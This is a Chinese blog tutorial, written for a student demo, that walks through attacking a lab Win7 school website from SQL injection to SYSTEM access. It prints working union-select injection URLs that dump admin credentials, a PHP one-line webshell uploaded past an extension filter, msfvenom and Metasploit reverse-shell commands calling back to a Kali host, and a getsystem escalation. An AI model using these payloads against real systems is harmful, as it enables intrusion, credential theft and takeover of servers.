---
title: 模拟网站攻击到提权的全部过程
tags: 渗透
top_img: >-
  https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/222.jpg
cover: >-
  https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/222.jpg
abbrlink: 46463
date: 2020-12-18 23:19:44
---

# 前言

今天去给新一届的学生演示一次网站拿webshell到系统提权的过程，但不幸的是中间翻车了，老年人紧张得忘记了msf监听木马的指令，然后哆哆嗦嗦的在大家眼下，打开了笔记查看一下2333......所以更新一下博客，给自己一个教训QWQ。

# 准备工作

靶机（被攻击方）：win7系统
入侵者（攻击方）：win10系统、kali系统

首先启动win7系统，搭建一个常见的校园网站，然后映射到局域网，使得我们能正常访问
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EUAM0%5DFV1UHQ43O%246FPAM11.png)

# 从网站拿到webshell

## sql注入漏洞

把整个网站浏览完一遍后，我们发现这里的url为?id=10结尾，我们猜测可能是一个sql注入点
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%28BBF9%7B%40%60VK%5DJ5YB59PLDC8.png)
首先我们在id=10后面加上一个单引号'进行判断
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%7DR0SQC6%40%25D0%24UCQD%28%7B_JBJB.png)
这个时候我们发现回显的数据不正常，于是我们再加一个注释符号
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EY%24%60%7BQF%5BOL_7B%7D1490~0NFR.png)
发现数据这个时候回显的时候是正常的，到这一步我们已经可以确定这里存在一个sql注入漏洞

> 原理我们可以简单解释一下
> 在网站中，我们一般使用数据库存储网站数据，网站和数据库是存在一个交互性。网站所呈现的内容是由代码中写入的sql语句调用数据库中的内容进行一个呈现，例如我们刚刚看到的文字。
> 而sql注入漏洞一般是由于程序员书写的sql语句不规范所导致的安全事件。

例如网站源码中使用如下的sql语句进行查询
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/1T2AQDR%295S%5B5%5D5%28FBQV%29EU3.png)
给语句结尾的where查询条件加上一个单引号'
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9YFRLV58FSE9%605E%405%7B3F_%25W.png)
很显然，我们传入的单引号和前面的单引号闭合，后面只有一个无法成对的单引号，然后报了语法错误。这个时候我们再加上`--+`注释符号注释掉后面的单引号
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/GSUAC7X6IS9%40_SDTJL%5DO4%60J.png)
这个时候查询的数据就会正确回显出来。

原理简单解释了一下之后，我们回到刚刚的网站。
这个时候我们发现存在sql注入漏洞之后，我们就开始进行查询对方网站数据库的数据，找到一些敏感信息，例如管理员的账号密码等等

首先，我们使用order by语句快速猜解出表中的列数
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CZATPZQ%249%293I4%5DQCRB%7BR9G3.png)
发现10列的时候报错，说明不足10列，我们继续缩小范围
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/JT6AZ1LLFZHL%4039EJE8OQ3E.png)
再查询第8列的时候，发现数据回显正确，说明对方表中含有列数8
我们使用union select 自定义查询测试一下，注意我们这里前面的id=10，要写成id=-10，把这里的查询置空
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/W8%25J%40U4%7D%5BD3HFH%7DNFML%25L_7.png)
发现会分别回显第三列、第五列和第七列。接下来我们就可以在三、五、七处做做文章

查询数据库名字：

```sql
http://192.168.1.167/yxlink/tuku/images.php?id=-10' union select 1,2,database(),4,5,6,7,8--+
```

![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EXY%40U7T%25JGYM6%25%7BD0G%29FZF0.png)
得到数据库名字：qzn_zuiai

查询数据库中的表名：

```sql
http://192.168.1.167/yxlink/tuku/images.php?id=-10' union select 1,2,group_concat(table_name),4,5,6,7,8 from information_schema.tables where table_schema="qzn_zuiai"--+
```

![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/64LOR%40WXDA7PCL2%5B8%40OWSJG.png)
得到一共se2admin,se2fl,se2hd,se2nr,se2tufl,se2tunr,se2wz,se2zf,sj3sk九张表
通过表名，我们猜测se2admin可能是存储管理员账号和密码的表，所以我们先查询这张表中的数据

查询表se2admin中的字段：

```sql
http://192.168.1.167/yxlink/tuku/images.php?id=-10' union select 1,2,group_concat(column_name),4,5,6,7,8 from information_schema.columns where table_name="se2admin"--+
```

![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2%24%60DI0KVJHJM5MK_S%29SZ~%40U.png)
得到表中的字段值有id，name，pass等，接下来我们查询name和pass的字段值

查询字段值：

```sql
http://192.168.1.167/yxlink/tuku/images.php?id=-10' union select 1,2,name,4,pass,6,7,8 from se2admin--+
```

![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/DNM1KIWQ3~%29TL03T%408%5D9G%60X.png)
我们得到管理员账号：admin，管理员账号密码：7fef6171469e80d32c0559f88b377245
很显然密码值是被加密的md5值，所以我们去网上找md5网站进行撞库查询
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/N%29%5DIF%40X%25H%29789%7B~MNS6K0%5BY.png)
得到管理员密码为：admin888
接下来我们需要查找这个网站的后台地址，我们使用御剑进行一个扫描
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/OV8QOF%25%7D6CVVLGW_5TQ1%5DTN.png)
御剑爆出了很多敏感地址，我们找到一个admin的目录，可能是后台地址，我们去访问一下
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/HCYIQ8PD4F%7BU5KVUEVY%7D9WG.png)
输入我们刚刚得到的管理员账号和密码admin:admin888
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P%40R%7BB8STI811URPWC%25%40GQ81.png)
这个时候，我们成功进入对方网站后台。

## 文件上传漏洞

接下来我们再这里找到一个文件上传点
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/A%28GNMR3D%29O%60%29AH3MKVRQ20U.png)
我们写一个简单的一句话木马

```php
<?php @eval($_POST['pass']);?>
```

![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/H6JI8CKP%256M_8%5BFOZ1_VKUS.png)
考虑到这里可能会对我们上传的文件进行一个后缀限制，例如只能上传jpg或者png图片格式文件等，所以我们把muma.txt改成muma.jpg格式
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P0S3ZG_4XI%29%7BGX14%25RQRYUA.png)
我们开启burpsuite，然后点提交，拦截到我们发送的数据包
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/FK_UC_0%25I%40Q~16XJN7%5B%601CQ.png)
我们把muma.jpg改回php文件类型：muma.php
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%7BRYDZJ0T4EZ%29FABTKYE5%24J.png)
然后发送数据包
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CC8K%256%7DFP%7DHA%5B2ZUFJP%5DDGE.png)
ok，已经上传成功，我们去找找我们上传后的路径
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/V8TW%7BRFNJ%40VVQ6ESZK60QYG.png)
得到我们的上传完整路径为：`http://192.168.1.167/yxlink/img/img_3699336993.php`
我们使用蚁剑进行连接我们上传的木马
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2_%5DLX62PYEDGHMP%6094SYA%29P.png)
成功连接，进入到对方服务器
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/QN_%60%5BB%5BTHV18Z1QFL3L%5B9EP.png)
到此，已成功拿到webshell

# 反弹shell连接

接下来我们利用kali的msf制作一个exe类型的反弹型木马

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali的ip LPORT=端口 -f 类型 -o 文件名
```

![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/YDU1EFKR~H3D%28U6OD6X%7DZ%25U.png)
把做好的木马，通过我们蚁剑刚刚连接的webshell进行上传
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/KUOL~L7CL4S%40%60GJXYIUU%295R.png)
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/L%25%40S3%5DE_A%40CF3_%251DUDNP%5BS.png)
上传成功后，我们在kali启动msf
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/B%7B%40%40%607%604Y~JIBZFXIR4VC7O.png)

**执行监听**

```shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.131
set lport 4444
exploit
```

![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9H%28VN~3CT57WQ1%7DL1MUQ_%7DB.png)
**执行木马**

msf开启监听之后，我们去蚁剑webshell执行我们上传的木马
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%5B%29C3QY%60V%7BV%282%29TRB%40VM7SBH.png)
执行之后，回到kali，我们可以看到msf目标正在回连，创建Meterpreter会话成功
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/SIL%25NM%29X3G%293%5DZ4%25S1F%28BCF.png)

**提权**

首先查看一下我们的用户权限
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%60H_A1%29K4%5DH3FWZ8FHFQDSMP.png)
发现是普通用户权限，之前我们已经在webshell观察到对方是win7系统，所以我们采用的是windows的载荷攻击
我们尝试使用getsystem进行提权试试
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/6%24I2J%24V91AJ%5D8RJDYHFLMNS.png)
发现直接提权成功，现在我们拥有windows最高权限system
接下来我们打印一下系统信息，并且拍照对方电脑现在状态
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/J8EE_%249FD%258GQ0%28%257%60%60BX14.png)
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CW%7BXP%7D_1%25%5BI6P8M%40M23J4SQ.png)
ok，成功。

# 结语

在拿到system权限之后，我们可以干很多很多的事......例如给对方种下后门，拿来当肉鸡等等。。。
这告诉我们开发网站必须注重安全，否则带来的后果是无穷大的。
emmm......这波有点难受。

**注：本博客仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本博客不承担任何法律及连带责任，请遵守中华人民共和国安全法**